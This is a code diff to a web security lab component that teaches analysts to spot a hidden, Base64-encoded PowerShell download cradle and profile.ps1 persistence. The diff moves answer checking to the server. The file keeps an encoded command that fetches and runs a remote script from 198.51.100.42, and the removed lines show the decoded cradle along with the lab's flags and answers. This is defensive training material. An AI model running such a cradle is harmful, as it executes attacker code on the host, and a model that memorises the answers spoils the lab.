@@ -1,12 +1,11 @@
 "use client";
 
 import { useState } from "react";
-import { TaskShell, MonoInput, SubmitBtn, reportWrong } from "./lab-ui";
+import { TaskShell, MonoInput, SubmitBtn, verifyStage, useRevealedFlags } from "./lab-ui";
 import { HintPanel } from "./hint-panel";
 
 const ENCODED_CMD = `powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADQAMgAvAHAALgBwAHMAMQAnACkA`;
 
-const DECODED_CMD = `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/p.ps1')`;
 
 const AMSI_LOG = `[Sysmon Event ID 1 — ProcessCreate]
   Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
@@ -36,6 +35,7 @@ export function PowershellAttackDetectionClient({
   completedStages: string[];
 }) {
   const [completed, setCompleted] = useState<string[]>(initial);
+  const [revealed, addReveal] = useRevealedFlags(labId);
   const [t1Choice, setT1Choice] = useState("");
   const [t1Error, setT1Error] = useState("");
   const [t2Answer, setT2Answer] = useState("");
@@ -46,44 +46,40 @@ export function PowershellAttackDetectionClient({
   const done = (s: string) => completed.includes(s);
   const allDone = done("task_1") && done("task_2") && done("task_3");
 
-  async function saveStage(stage: string) {
-    await fetch("/api/labs/response", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ labId, stage, response: "correct" }),
-    });
-    setCompleted((p) => [...p, stage]);
+  function markDone(stage: string, reveal?: string) {
+    setCompleted((p) => (p.includes(stage) ? p : [...p, stage]));
+    addReveal(stage, reveal);
   }
 
-  function submitT1(e: React.FormEvent) {
+  async function submitT1(e: React.FormEvent) {
     e.preventDefault();
-    if (t1Choice === "-Enc (Base64-encoded command)") {
+    const verdict = await verifyStage(labId, "task_1", t1Choice);
+    if (verdict.correct) {
       setT1Error("");
-      void saveStage("task_1");
+      markDone("task_1", verdict.reveal);
     } else {
-      reportWrong(labId, "task_1");
       setT1Error("Incorrect. Look at the flag immediately before the long string of letters and numbers.");
     }
   }
 
-  function submitT2(e: React.FormEvent) {
+  async function submitT2(e: React.FormEvent) {
     e.preventDefault();
-    if (t2Answer.trim().replace(/\s+/g, "") === DECODED_CMD.replace(/\s+/g, "") || t2Answer.toLowerCase().includes("198.51.100.42/p.ps1")) {
+    const verdict = await verifyStage(labId, "task_2", t2Answer);
+    if (verdict.correct) {
       setT2Error("");
-      void saveStage("task_2");
+      markDone("task_2", verdict.reveal);
     } else {
-      reportWrong(labId, "task_2");
       setT2Error("Incorrect. -Enc payloads are Base64 of UTF-16LE text — decode it to find the URL being fetched.");
     }
   }
 
-  function submitT3(e: React.FormEvent) {
+  async function submitT3(e: React.FormEvent) {
     e.preventDefault();
-    if (t3Choice === "PowerShell profile.ps1 persistence") {
+    const verdict = await verifyStage(labId, "task_3", t3Choice);
+    if (verdict.correct) {
       setT3Error("");
-      void saveStage("task_3");
+      markDone("task_3", verdict.reveal);
     } else {
-      reportWrong(labId, "task_3");
       setT3Error("Incorrect. This file runs automatically every time a new PowerShell session starts.");
     }
   }
@@ -116,7 +112,7 @@ export function PowershellAttackDetectionClient({
           </form>
         )}
         {done("task_1") && (
-          <p className="text-sm font-mono text-sage-400">Correct — -Enc takes a Base64-encoded UTF-16LE string, hiding the real command from plain-text log scanning. Flag: SAGE&#123;3nc0d3d_p0w3rsh3ll_fl4g&#125;</p>
+          <p className="text-sm font-mono text-sage-400">Correct — -Enc takes a Base64-encoded UTF-16LE string, hiding the real command from plain-text log scanning. Flag: {revealed.task_1 ?? "SAGE{…}"}</p>
         )}
       </TaskShell>
 
@@ -141,7 +137,7 @@ export function PowershellAttackDetectionClient({
           </form>
         )}
         {done("task_2") && (
-          <p className="text-sm font-mono text-sage-400">Correct — the command was a download-cradle fetching a second-stage script from 198.51.100.42/p.ps1. Flag: SAGE&#123;d0wnl04d_cr4dl3_f0und&#125;</p>
+          <p className="text-sm font-mono text-sage-400">Correct — the command was a download-cradle fetching a second-stage script from 198.51.100.42/p.ps1. Flag: {revealed.task_2 ?? "SAGE{…}"}</p>
         )}
       </TaskShell>
 
@@ -171,7 +167,7 @@ export function PowershellAttackDetectionClient({
           </form>
         )}
         {done("task_3") && (
-          <p className="text-sm font-mono text-sage-400">Correct — profile.ps1 executes automatically on every new PowerShell session, re-fetching the payload each time. Flag: SAGE&#123;pr0fil3_p3rsist3nc3&#125;</p>
+          <p className="text-sm font-mono text-sage-400">Correct — profile.ps1 executes automatically on every new PowerShell session, re-fetching the payload each time. Flag: {revealed.task_3 ?? "SAGE{…}"}</p>
         )}
       </TaskShell>
 
@@ -179,9 +175,9 @@ export function PowershellAttackDetectionClient({
         <div className="rounded-lg border border-sage-500/40 bg-sage-500/5 p-5 space-y-3">
           <h3 className="font-bold text-sage-400 text-base">Room Complete</h3>
           <ul className="space-y-1 font-mono text-sm">
-            <li><span className="text-zinc-500">Task 1 —</span> <span className="text-sage-400">SAGE&#123;3nc0d3d_p0w3rsh3ll_fl4g&#125;</span></li>
-            <li><span className="text-zinc-500">Task 2 —</span> <span className="text-sage-400">SAGE&#123;d0wnl04d_cr4dl3_f0und&#125;</span></li>
-            <li><span className="text-zinc-500">Task 3 —</span> <span className="text-sage-400">SAGE&#123;pr0fil3_p3rsist3nc3&#125;</span></li>
+            <li><span className="text-zinc-500">Task 1 —</span> <span className="text-sage-400">{revealed.task_1 ?? "SAGE{…}"}</span></li>
+            <li><span className="text-zinc-500">Task 2 —</span> <span className="text-sage-400">{revealed.task_2 ?? "SAGE{…}"}</span></li>
+            <li><span className="text-zinc-500">Task 3 —</span> <span className="text-sage-400">{revealed.task_3 ?? "SAGE{…}"}</span></li>
           </ul>
         </div>
       )}
